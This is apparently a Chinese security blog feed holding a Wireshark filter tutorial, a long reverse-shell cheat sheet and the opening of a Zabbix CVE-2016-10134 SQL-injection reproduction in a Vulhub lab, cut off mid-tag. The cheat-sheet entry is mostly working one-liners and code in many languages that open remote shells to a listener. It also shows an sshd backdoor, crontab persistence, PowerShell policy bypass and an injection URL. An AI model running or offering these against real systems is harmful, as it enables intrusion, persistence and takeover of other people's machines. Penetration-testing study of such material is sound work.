        <content type="html"><![CDATA[<h2 id="一、网卡模式"><a href="#一、网卡模式" class="headerlink" title="一、网卡模式"></a>一、网卡模式</h2><h3 id="标准模式"><a href="#标准模式" class="headerlink" title="标准模式"></a>标准模式</h3><p>网卡只接收目标地址是自己的数据包。</p><h3 id="混杂模式"><a href="#混杂模式" class="headerlink" title="混杂模式"></a>混杂模式</h3><p>只要数据包经过网卡，网卡就会接受该包，不管其目的地址是否为自己。</p><p><strong>混杂模式设置：</strong></p><p>网络与共享中心–&gt;本地连接–&gt;属性–&gt;配置–&gt;高级–&gt;网速与全双工–&gt;auto（自动匹配）</p> <a id="more"></a><h2 id="二、使用wireshark分析HTTP数据包"><a href="#二、使用wireshark分析HTTP数据包" class="headerlink" title="二、使用wireshark分析HTTP数据包"></a>二、使用wireshark分析HTTP数据包</h2><h3 id="封包详细信息"><a href="#封包详细信息" class="headerlink" title="封包详细信息"></a>封包详细信息</h3><ul><li>Frame 数据帧情况 –&gt;物理层<ul><li>接口id</li><li>封装类型</li><li>捕获时间</li><li>时间戳</li><li>帧序列号</li><li>帧长度</li><li>捕获长度</li></ul></li><li>Ethernet Ⅱ 数据链路层 以太网帧头部信息<ul><li>目标mac</li><li>源mac</li><li>IP类型（跟下一层有关）</li></ul></li><li><p>IPv4：网络层</p><ul><li>版本</li><li>头部长度</li><li>差分服务字段</li><li>总长度</li><li>标志字段</li><li>标记字段</li><li>TTL</li><li><p>上层协议</p></li><li><p>头部数据的校验和</p></li><li>源IP</li><li>目的IP</li></ul></li><li><p>Transmission Control Protocol    传输层</p><ul><li>源端口</li><li>目的端口</li><li>序列号</li><li>下一个序列号</li><li>确认号</li><li>头部长度</li><li>标记</li><li>窗口大小</li><li>校验和</li><li>urgent_pointer紧急指针</li></ul></li><li><p>Hypertext Transfer Protocol    </p><p>接下来跟浏览器抓包的内容大致相同，这里就省略了。</p></li></ul><h2 id="三、基本功能"><a href="#三、基本功能" class="headerlink" title="三、基本功能"></a>三、基本功能</h2><h3 id="数据包筛选"><a href="#数据包筛选" class="headerlink" title="数据包筛选"></a>数据包筛选</h3><p>协议筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcp  筛选协议为tcp的流量包</span><br><span class="line">udp 筛选协议为udp的流量包</span><br><span class="line">arp/icmp/http/ftp/dns/ip  筛选协议为arp/icmp/http/ftp/dns/ip的流量包</span><br></pre></td></tr></table></figure><p>mac地址筛选:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eth.dst ==A0:00:00:04:C5:84 筛选目标mac地址</span><br><span class="line">eth.addr==A0:00:00:04:C5:84 筛选MAC地址</span><br></pre></td></tr></table></figure><p>IP筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.1.1 找源是192.168.1.1的记录</span><br><span class="line">#或者右键IPv4下的Source字段，作为过滤器应用-选中</span><br><span class="line">ip.dst == 192.168.1.2 找目的IP是192.168.1.2的记录</span><br><span class="line">#或者右键IPv4下的Destination字段，作为过滤器应用-选中</span><br><span class="line">ip.addr == 192.168.1.1 找记录中含有192.168.1.1的（不分源和目的）</span><br></pre></td></tr></table></figure><p>端口筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcp.port == 80   端口是80的记录</span><br><span class="line">tcp.dstport == 80  筛选tcp协议的目标端口为80 的流量包</span><br><span class="line">tcp.srcport == 80  筛选tcp协议的源端口为80 的流量包</span><br><span class="line">udp.srcport == 80  筛选udp协议的源端口为80 的流量包</span><br></pre></td></tr></table></figure><p>http请求筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">请求方法为GET：</span><br><span class="line">http.request.method==&quot;GET&quot;#筛选HTTP请求方法为GET的流量包</span><br><span class="line"></span><br><span class="line">请求方法为POST：</span><br><span class="line">http.request.method==&quot;POST&quot;#筛选HTTP请求方法为POST的流量包</span><br><span class="line"></span><br><span class="line">指定URI：</span><br><span class="line">http.request.uri==&quot;/img/logo-edu.gif&quot; #筛选HTTP请求的URL为/img/logo-edu.gif的流量包</span><br><span class="line"></span><br><span class="line">请求或相应中包含特定内容：</span><br><span class="line">http contains &quot;FLAG&quot;#筛选HTTP内容为/FLAG的流量包</span><br></pre></td></tr></table></figure><p>包长度筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">udp.length ==20筛选长度为20的udp流量包</span><br><span class="line">tcp.len &gt;=20筛选长度大于20的tcp流量包</span><br><span class="line">ip.len ==20 筛选长度为20的IP流量包</span><br><span class="line">frame.len ==20 筛选长度为20的整个流量包</span><br></pre></td></tr></table></figure><p>连接符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and&amp;</span><br><span class="line">or||</span><br></pre></td></tr></table></figure><h3 id="数据包搜索"><a href="#数据包搜索" class="headerlink" title="数据包搜索"></a>数据包搜索</h3><p>Ctrl + F，一般选择字符串方式搜索，左侧选择分组内容（列表、详情、字节流）。</p><h3 id="数据包还原"><a href="#数据包还原" class="headerlink" title="数据包还原"></a>数据包还原</h3><p>选中想要还原的流量包，右键选中，选择追踪流—TCP流/UDP流/SSL流/HTTP流。</p><h3 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h3><p>Wireshark支持提取通过http传输（上传/下载）的文件内容，方法如下：</p><p>选中http文件传输流量包，在分组详情中找到data或者Line-based text data:text/html层，鼠标右键点击 – 选中 导出分组字节流。</p><p>如果是菜刀下载文件的流量，需要删除分组字节流前开头和结尾的X@Y字符，否则下载的文件会出错。鼠标右键点击 – 选中 显示分组字节；在弹出的窗口中设置开始和结束的字节（原字节数开头加3，结尾减3），最后点击save as按钮导出。</p><p>参考：</p><p><a href="https://blog.csdn.net/daxueba/article/details/46911511" target="_blank" rel="noopener">Wireshark数据抓包教程之认识捕获分析数据包</a></p><p><a href="https://www.freebuf.com/column/199838.html" target="_blank" rel="noopener">CTF流量分析之wireshark使用</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2019/06/01/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2019/06/01/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="一、参考文章"><a href="#一、参考文章" class="headerlink" title="一、参考文章"></a>一、参考文章</h1><p><strong>参考链接</strong>：</p><p><a href="https://klionsec.github.io/2016/09/27/revese-shell/" target="_blank" rel="noopener">你和目标只差一个shell的距离</a> </p><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">Pentest Monkey-关于反向shell的cheatsheet</a></p><p><a href="https://www.sohu.com/a/161766202_709042" target="_blank" rel="noopener">如何将简单的Shell转换成为完全交互式的TTY</a></p><h1 id="二、Linux下反弹shell"><a href="#二、Linux下反弹shell" class="headerlink" title="二、Linux下反弹shell"></a>二、Linux下反弹shell</h1><h2 id="利用perl的socket"><a href="#利用perl的socket" class="headerlink" title="利用perl的socket"></a>利用perl的socket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;192.168.1.128&quot;;$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure><h2 id="利用系统特殊设备文件"><a href="#利用系统特殊设备文件" class="headerlink" title="利用系统特殊设备文件"></a>利用系统特殊设备文件</h2><p>就是把bash的数据全部通多/dev/tcp建立的socket发过去,以此来达到反弹shell的效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.128/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="利用sshd"><a href="#利用sshd" class="headerlink" title="利用sshd"></a>利用sshd</h2><blockquote><p>注意：正向连接，有防火墙阻隔</p></blockquote><p>第一种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//服务端开启端口服务</span><br><span class="line">netstat -tulnp | grep &quot;8080&quot;</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8080;</span><br><span class="line">netstat -tulnp | grep &quot;8080&quot;</span><br><span class="line"></span><br><span class="line">//把sshd绑定在本地的8080端口，从8080端口进来就相当于本机的sshd端口</span><br><span class="line">ln -f//把原有的数据清空</span><br><span class="line">-o//去掉第一次ssh连接的那个密钥对提示</span><br><span class="line"></span><br><span class="line">//客户端连接</span><br><span class="line">ssh root@192.168.1.129 -p 8080      一定要注意在自己本地机器上用这个端口去连</span><br><span class="line">pkill su</span><br></pre></td></tr></table></figure><p>第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line">echo &apos;#!/usr/bin/perl&apos; &gt;sshd</span><br><span class="line">echo &apos;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd</span><br><span class="line">echo &apos;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br><span class="line">socat STDIO TCP4:192.168.1.129:22,sourceport=13377</span><br></pre></td></tr></table></figure><h2 id="普通nc反弹"><a href="#普通nc反弹" class="headerlink" title="普通nc反弹"></a>普通nc反弹</h2><p>利用最古老的nc来反弹,但默认正常发行版中默认带的那个nc都是阉割版的,即没有-e选项,也就意味着不能直接用它反弹shell,好在强大的linux为我们提供了一个建立管道的工具mkfifo和bash本身的各种管道特性,我们就可以利这种方式,把bash的数据通过管道反弹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.128 8080 &gt;/tmp/f</span><br></pre></td></tr></table></figure><h2 id="完全版nc反弹"><a href="#完全版nc反弹" class="headerlink" title="完全版nc反弹"></a>完全版nc反弹</h2><p>正向</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp 8989 -e /bin/bash//服务端开启监听</span><br><span class="line">nc -vv 192.168.10.10 8989//客户端建立连接</span><br></pre></td></tr></table></figure><p>反向</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8989</span><br><span class="line">nc -e /bin/bash 10.0.3.4 8989</span><br></pre></td></tr></table></figure><h2 id="加密nc反弹"><a href="#加密nc反弹" class="headerlink" title="加密nc反弹"></a>加密nc反弹</h2><p>加密版的netcat = ‘cryptcat’,可以设置连接密码,用-k指定下即可,kali默认自带,如果是目标机器,可能需要你自己手工动装一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cryptcat -vv -l -p 25 -k sec</span><br><span class="line">cryptcat -vv -l -p 80 -k sec</span><br><span class="line">cryptcat 192.168.12.141 80 -k sec|cmd.exe|cryptcat 192.168.12.141 25 -k sec</span><br></pre></td></tr></table></figure><h2 id="利用awk-gawk"><a href="#利用awk-gawk" class="headerlink" title="利用awk/gawk"></a>利用awk/gawk</h2><p>awk就不用多说了吧,linux文本处理三剑客的老大,语句的意思也非常简单,就是循环发socket</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.1.128/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&apos;</span><br></pre></td></tr></table></figure><h2 id="利用telent客户端"><a href="#利用telent客户端" class="headerlink" title="利用telent客户端"></a>利用telent客户端</h2><p>利用系统自带的telnet客户端来反弹shell,一般运维默认都会把它装上</p><p>第一种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp 1080   //命令结果显示窗口</span><br><span class="line">nc -lvp 8080   //命令传输窗口</span><br><span class="line"></span><br><span class="line">telnet 192.168.1.127 8080 | /bin/bash | telnet 192.168.1.128 1080</span><br></pre></td></tr></table></figure><p>第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">mknod test p &amp;&amp; telnet 192.168.1.128 8080 0&lt;test | /bin/bash 1&gt;test</span><br></pre></td></tr></table></figure><h2 id="利用python"><a href="#利用python" class="headerlink" title="利用python"></a>利用python</h2><p>就像perl在绝大多数发行版上都已经自带,但默认是2.6.6</p><p>这里用最简单的方法，py的socket来反弹一个shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.128&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure><p>还有高级的用法py reverse_shell</p><h2 id="利用crontab定时反弹"><a href="#利用crontab定时反弹" class="headerlink" title="利用crontab定时反弹"></a>利用crontab定时反弹</h2><p>很容被发现,临时用用还行,至于用什么反弹,随意,perl,py都行,你喜欢,用完以后记得立马删掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;* * * * *  /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.1.128\&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n&quot;)|crontab -</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure><h2 id="利用php的socket"><a href="#利用php的socket" class="headerlink" title="利用php的socket"></a>利用php的socket</h2><p>对于php的网站,也许我们可以利用上,也是很多php大马里默认的反弹方式,当然,除了php脚本,别的web后端脚本其实都可以被利用,比如,jsp…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">/usr/local/php/bin/php -r &apos;$sock=fsockopen(&quot;192.168.1.128&quot;,8080);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure><h2 id="利用java"><a href="#利用java" class="headerlink" title="利用java"></a>利用java</h2><p>如果目标机器上有java环境,那就更好了,直接用java来弹,效果一般还是非常好的,而且java的免杀效果也很不错哦,把下面的代码打成jar包就可以了,记得打之前改下里面要反弹到的ip和端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">public class Revs &#123;</span><br><span class="line">    /**</span><br><span class="line">    * @param args</span><br><span class="line">    * @throws Exception </span><br><span class="line">    */</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // TODO Auto-generated method stub</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.1.128/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用ruby的socket"><a href="#利用ruby的socket" class="headerlink" title="利用ruby的socket"></a>利用ruby的socket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;192.168.1.128&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</span><br></pre></td></tr></table></figure><h2 id="利用lua的socket"><a href="#利用lua的socket" class="headerlink" title="利用lua的socket"></a>利用lua的socket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">apt-get install lua50 -y</span><br><span class="line">apt-get install luarocks -y</span><br><span class="line">luarocks install luasocket</span><br><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;192.168.1.128&apos;,&apos;8080&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br></pre></td></tr></table></figure><h2 id="利用nodejs"><a href="#利用nodejs" class="headerlink" title="利用nodejs"></a>利用nodejs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">(function()&#123;</span><br><span class="line">    var net = require(&quot;net&quot;),</span><br><span class="line">    cp = require(&quot;child_process&quot;),</span><br><span class="line">    sh = cp.spawn(&quot;/bin/sh&quot;, []);</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(8080, &quot;10.17.26.64&quot;, function()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    return /a/;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="利用c版的reverse-shell"><a href="#利用c版的reverse-shell" class="headerlink" title="利用c版的reverse_shell"></a>利用c版的reverse_shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">gcc c_revese_shell.c -o cshell</span><br><span class="line">./cshell 192.168.1.128 8080</span><br></pre></td></tr></table></figure><h2 id="利用gcc反弹shell"><a href="#利用gcc反弹shell" class="headerlink" title="利用gcc反弹shell"></a>利用gcc反弹shell</h2><p>待补充</p><h1 id="三、基于不同协议下的shell反弹方式"><a href="#三、基于不同协议下的shell反弹方式" class="headerlink" title="三、基于不同协议下的shell反弹方式"></a>三、基于不同协议下的shell反弹方式</h1><h2 id="利用icmp"><a href="#利用icmp" class="headerlink" title="利用icmp"></a>利用icmp</h2><p>需要你自己先编译下,会生成两个文件,一个服务端[ishd]一个客户端[ish],自己有兴趣可以拿wireshark看下,通常用来穿透高层防火墙</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make linux</span><br><span class="line">./ishd -i 6555 -t 0 -p 8080</span><br><span class="line">./ish -i 6555 -t 0 -p 8080 192.168.1.129[这里的ip可以换成域名]</span><br></pre></td></tr></table></figure><h2 id="利用udp"><a href="#利用udp" class="headerlink" title="利用udp"></a>利用udp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 53 -u     //注意这里务必要用udp的模式来接</span><br><span class="line">python udpshell.py 192.168.1.128 53 udp</span><br></pre></td></tr></table></figure><h2 id="利用dns"><a href="#利用dns" class="headerlink" title="利用dns"></a>利用dns</h2><p>详情可自行参考cobalt strike,那可能是现今最好的dns隧道学习样例</p><h1 id="四、win平台反弹shell"><a href="#四、win平台反弹shell" class="headerlink" title="四、win平台反弹shell"></a>四、win平台反弹shell</h1><h2 id="利用powershell"><a href="#利用powershell" class="headerlink" title="利用powershell"></a>利用powershell</h2><p>除了上面那些可以通用的语言反弹shell之外,win下最重要应该是powershell了</p><blockquote><p>注意：vbs只在03以下的系统</p></blockquote><p>利用powercat来反弹shell,其实就是powershell版的netcat</p><p>首先,在本机创建好powershell版的reverse shell的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Set-ExecutionPolicy Unrestricted</span><br><span class="line">PS C:\&gt; cd .\powercat</span><br><span class="line">PS C:\powercat&gt; Import-Module .\powercat.ps1</span><br><span class="line">PS C:\powercat&gt; powercat -c 192.168.1.128 -p 8080 -e cmd -g &gt;&gt; payload.ps1</span><br><span class="line">C:\&gt;nc -lvp 8080</span><br></pre></td></tr></table></figure><p>然后,把payload.ps1丢到目标机器上去执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\payload.ps1&apos;&#125;&quot;</span><br></pre></td></tr></table></figure><h2 id="利用nishang"><a href="#利用nishang" class="headerlink" title="利用nishang"></a>利用nishang</h2><p>待补充</p><h1 id="五、Metasploit的msfvenom"><a href="#五、Metasploit的msfvenom" class="headerlink" title="五、Metasploit的msfvenom"></a>五、Metasploit的msfvenom</h1><p>Metasploit在“cmd/unix”下，有几个可用于生成单行绑定或反向shell的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep &quot;cmd/unix&quot;|awk &apos;&#123;print $1&#125;&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/06/01/反弹shell/1556788641854.png" alt="1556788641854"></p><p>以上显示的所有payload都可以和msfvenom一起使用，并且我们可以根据自身需求指定LHOST，LPORT或RPORT。</p><p>例如，这里是一个不需要-e标志的netcat命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat 192.168.11.11 LPORT=3430 R</span><br></pre></td></tr></table></figure><p><img src="/2019/06/01/反弹shell/1556788801376.png" alt="1556788801376"></p><p>如果没有安装netcat，我们还可以生成一个Perl的反向shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl RHOST=192.168.11.11 LPORT=3430 R</span><br></pre></td></tr></table></figure><p><img src="/2019/06/01/反弹shell/1556788895224.png" alt="1556788895224"></p><p>这些都可以通过使用netcat，并侦听指定的端口（4444）来捕获。</p><h1 id="六、简单Shell转换交互式TTY"><a href="#六、简单Shell转换交互式TTY" class="headerlink" title="六、简单Shell转换交互式TTY"></a>六、简单Shell转换交互式TTY</h1><h2 id="利用Python的pty"><a href="#利用Python的pty" class="headerlink" title="利用Python的pty"></a>利用Python的pty</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;//这里注意引号</span><br></pre></td></tr></table></figure><p>使用Metasploit的msfvenom一行生成命令</p><h1 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h1><p>反弹的核心就是和目标系统建立socket，如果中间（正向和反向）端口被防火墙阻断,可能就只能选择复用或者直接走更底层的协议；</p><p>shell的方法很多，怎么在实战中按照的需求改进，才是更需要思考的；</p><p>反弹的时候，进程会一直处于挂起状态，通过放至后台进程保持连接。</p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zabbix-SQL注入-getshell-CVE-2016-10134</title>
      <link href="/2019/05/21/zabbix-SQL%E6%B3%A8%E5%85%A5-getshell-CVE-2016-10134/"/>
      <url>/2019/05/21/zabbix-SQL%E6%B3%A8%E5%85%A5-getshell-CVE-2016-10134/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><p>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p><p>Zabbix 的latest.php中的toggle_ids[]或jsrpc.php中的profieldx2参数存在sql注入，通过sql注入获取管理员账户密码，进入后台，进行getshell操作。</p><h2 id="二、漏洞条件"><a href="#二、漏洞条件" class="headerlink" title="二、漏洞条件"></a>二、漏洞条件</h2><p>版本：</p><ul><li>2.2.x</li><li>3.3.0-3.03</li></ul><h2 id="三、复现漏洞"><a href="#三、复现漏洞" class="headerlink" title="三、复现漏洞"></a>三、复现漏洞</h2><p>感谢<a href="https://vulhub.org/#/environments/zabbix/CVE-2016-10134/" target="_blank" rel="noopener">Vulhub</a>提供的漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/vulhub/zabbix/CVE-2016-10134#注意自己的安装路径</span><br><span class="line">docker-compose up -d#启动zabbix3.0.3</span><br></pre></td></tr></table></figure><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558410510855.png" alt="1558410510855"></p><p>第一种方式需要：zabbix开启guest权限，guest的默认密码为空。</p><p>输入账号<code>guest</code>，密码为空，登陆游客账户。</p><p>登陆成功后，查看cookie中的<code>zbx_sessionid</code>，复制后16位字符</p><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558410873676.png" alt="1558410873676"></p><p>然后将<code>8a7f592d81c1ebd4</code>当作sid的值，访问如下链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/latest.php?output=ajax&amp;sid=8a7f592d81c1ebd4&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)</span><br></pre></td></tr></table></figure><p>注入成功：</p><p><img 